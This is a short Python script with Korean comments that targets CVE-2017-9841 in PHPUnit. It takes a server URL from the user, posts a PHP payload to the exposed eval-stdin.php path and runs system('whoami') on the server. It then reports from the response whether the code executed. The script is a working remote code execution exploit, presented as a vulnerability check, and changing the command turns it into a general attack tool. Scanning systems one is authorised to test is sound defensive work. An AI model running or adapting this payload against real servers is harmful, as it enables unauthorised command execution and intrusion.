# SPDX-FileCopyrightText: © 2025 KimJuhyeong95 <bisyop@naver.com>
# SPDX-License-Identifier: MIT

import requests

# 사용자로부터 base URL (서버 IP 또는 도메인) 입력 받기
base_url = input("취약한 서버의 기본 URL을 입력하세요 (예: http://192.168.1.100): ")

# URL 끝에 슬래시가 없으면 자동으로 추가하고 취약 경로 붙이기
target_url = base_url.rstrip('/') + "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"

# 취약 여부 판별용 PHP 코드 (테스트 문자열 포함)
php_payload = "<?php echo 'cve-2017-9841-TEST'; system('whoami'); ?>"

print(f"[i] 대상 URL: {target_url}")
print("[i] PHP 페이로드 전송 중...")

try:
    response = requests.post(target_url, data=php_payload)

    if response.status_code == 200:
        if "cve-2017-9841-TEST" in response.text:
            print("[🔥] 취약: 서버가 PHP 코드를 실행했습니다. (CVE-2017-9841 exploitable)")
            print("[📄] 응답 일부:")
            print(response.text.strip()[:300])
        else:
            print("[✔️] 비취약 또는 차단됨")
            print(f"[i] HTTP 상태 코드: {response.status_code}")
            print("[i] 응답 일부:")
            print(response.text.strip()[:300])
    else:
        print(f"[✖️] 요청 실패. 상태 코드: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"[❌] 요청 중 오류 발생: {e}")
